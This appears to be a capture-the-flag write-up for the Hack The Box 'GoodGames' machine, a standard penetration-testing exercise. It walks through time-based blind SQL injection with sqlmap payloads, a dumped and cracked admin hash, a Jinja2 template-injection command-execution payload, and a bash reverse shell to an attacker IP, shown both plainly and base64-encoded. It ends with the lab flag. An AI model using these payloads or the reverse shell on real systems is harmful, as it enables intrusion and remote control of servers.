Nmap
```
└─$ nmap -sCV -p- 10.129.226.138                                                                                                                                                                                                    
Nmap scan report for 10.129.226.138 
Host is up (0.019s latency). 
Not shown: 65534 closed ports 
PORT   STATE SERVICE  VERSION 
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2 
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2 
|_http-title: GoodGames | Community and Store 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 441.90 second
```
Time based blind sql injection in sign in page

![image](https://user-images.githubusercontent.com/87831546/142666137-ceea7690-cae8-4822-bc26-9b876198f1cf.png)

```log
$ sqlmap -u http://goodgames.htb/login --data="email=a%40a.a&password=a" -D main -T user -dump

[*] starting @ 13:00:46 /2021-11-20/

[13:00:47] [INFO] resuming back-end DBMS 'mysql' 
[13:00:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=a@a.a' AND (SELECT 6708 FROM (SELECT(SLEEP(5)))hpPZ) AND 'VYTZ'='VYTZ&password=a

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=a@a.a' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162627671,0x69676b6673706955474a69524d724968636c576a65614b6c704b454745665a564242466c55717a57,0x7171787671)-- -&password=a
---
[13:00:47] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[13:00:47] [INFO] fetching columns for table 'user' in database 'main'
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] n
[13:00:50] [INFO] fetching entries for table 'user' in database 'main'
[13:00:50] [INFO] recognized possible password hashes in column '`password`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: main
Table: user
[1 entry]
+------+---------------------+--------+----------------------------------+
| id   | email               | name   | password                         |
+------+---------------------+--------+----------------------------------+
| 1    | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+------+---------------------+--------+----------------------------------+
```

Dump the users table and we find admin credentials
```
admin@goodgames.htb
2b22337f218b2d82dfc3b6f77e7cb8ec
```

Crack the hash and logging into admin account and clicking on the settings feature we find subdomain:
```
internal-administration
```
![image](https://user-images.githubusercontent.com/87831546/142666394-11ee96c4-64db-474f-84a0-b04c1596f3c0.png)

Add to /etc/hosts

![image](https://user-images.githubusercontent.com/87831546/142666449-b32e99e2-1e05-436b-80a5-0687144c6b03.png)

Login with 
```
admin@goodgames.htb
superadministrator
```
![image](https://user-images.githubusercontent.com/87831546/142666482-c888bc72-307e-45ac-a17e-272420a7c995.png)

Flask application and SSTI in the Full Name field
![image](https://user-images.githubusercontent.com/87831546/142666543-8ccb3f45-0888-4244-a549-2cfcd97ec2a0.png)

Command execution through SSTI:
```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
```
Get reverse shell by base64 encoding bash reverse shell then piping to base64 decode and then piped to bash
```
bash -i >& /dev/tcp/10.10.14.42/4242 0>&1
```
```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Mi8xMjM0IDA+JjE= | base64 -d | bash').read() }}
```
```
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
````
